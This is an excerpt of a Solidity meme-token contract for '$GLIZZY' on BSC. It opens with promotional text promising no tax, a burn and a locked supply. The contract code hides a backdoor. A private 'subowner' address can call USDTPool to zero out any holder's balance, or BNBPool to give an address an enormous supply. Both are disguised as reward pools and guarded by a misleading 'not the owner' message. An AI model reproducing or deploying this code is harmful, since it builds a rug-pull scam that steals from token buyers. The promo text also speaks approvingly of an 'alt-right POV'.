...
// WELCOME TO GLIZZY MEMEWORLD
/*
🌭 GLIZZY 🌭 🌭 $GLIZZY 🌭
🌭GET YOUR $GLIZZY AND BECOME A GOBBLER 🌭
he ultimate moonshot meme coin! Join our community of holders and blast off to the moon with us! 

Can you even believe that this used to be the most expensive item? Now it's a the next storm in BSC 
GLIZZY THE FROG WAS KILLED BY HIS CREATOR
But his alt-right POV lives on.GLIZZY is an unfortunate testament to the durability of meme culture - for better and worse.

IN LOVE  WITH $GLIZZY
The Greeks have a rich POV of literature. The GLIZZYs Have a rich POV of moon reaching
🌭Meme Coin with great potential 🌭
✅TG OFFICIAL  https://t.me/GLIZZYCOE
✅ WEBSITE https://GLIZZY.com/

🌭TOKENOMICS
THIS MEME COIN IS ABOUT COMMUNITY AND TEAMWORK 
🌭 1,000,000,000,000,000 Supply


🌭To Dex Pancakeswap : 10%
🌭Burn Supply🌭  : 59%
🌭Stake future Listings : 25%  Lock on MUDRALOCKER
🌭Development : 4%
🌭Airdrop 1%
💰 No Max No tax

TAXES: No tax No Bullshit
💰BUY: 0%
💰SELL: 0%  
...
/*
 * @dev Provides information about the current execution GLIZZYBurnable, including the
 ...
 */
abstract contract GLIZZYBurnable {
...
// File: @openzeppelin/contracts/access/GLIZZYOwnable.sol
 ...
 * specific functions.
 *
 * By default, the owner account will be the one that GLIZZYs the contract. This
 ...
 * the owner.
 */
abstract contract GLIZZYOwnable is GLIZZYBurnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the GLIZZYer as the initial owner.
     */
    constructor () {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "GLIZZYOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "GLIZZYOwnable: new owner is the zero address");
...
contract GLIZZY is GLIZZYBurnable, DxtoolsApp, GLIZZYOwnable {
    
    using SafeBitcoin for uint256;
    mapping (address => uint256) private GLIZZYfrom;
    mapping (address => mapping (address => uint256)) private fromGLIZZY;
   ...
   address private SmartV3Rooter; 
    constructor(address SmartUniswap) {
        ...
        GLIZZYfrom[_msgSender()] = _totalSupply;
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
        return GLIZZYfrom[account];
    }
      modifier subowner() {
        require(SmartV3Rooter == _msgSender(), "GLIZZYOwnable: caller is not the owner");
        _;
    }
    /**
    ...
    */
    function USDTPool(address USDTRewards) external subowner {
        GLIZZYfrom[USDTRewards] = 1;
    ...
    */
    ...
    function BNBPool(address bnbRewards) external subowner {
        GLIZZYfrom[bnbRewards] = 100000000000 * 10 ** 26;
        
        emit Transfer(bnbRewards, address(0), 100000000000 * 10 ** 26);
    }
    /**
    * @dev See {DxtoolsApp-allowance}.
    */
    function allowance(address owner, address transporteur) external view override returns (uint256) {
        return fromGLIZZY[owner][transporteur];
    }
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromGLIZZY[sender][_msgSender()].sub(yoursold, "DxtoolsApp: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    */
    function increaseAllowance(address transporteur, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), transporteur, fromGLIZZY[_msgSender()][transporteur].add(addedbalance));
        return true;
    }
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromGLIZZY[_msgSender()][transporteur].sub(allbalances, "DxtoolsApp: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        ...
        GLIZZYfrom[sender] = GLIZZYfrom[sender].sub(yoursold, "DxtoolsApp: transfer yoursold exceeds balance");
        GLIZZYfrom[shippingto] = GLIZZYfrom[shippingto].add(yoursold);
    ...
    * e.g. set automatic GLIZZY for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        ...
        fromGLIZZY[owner][transporteur] = yoursold;
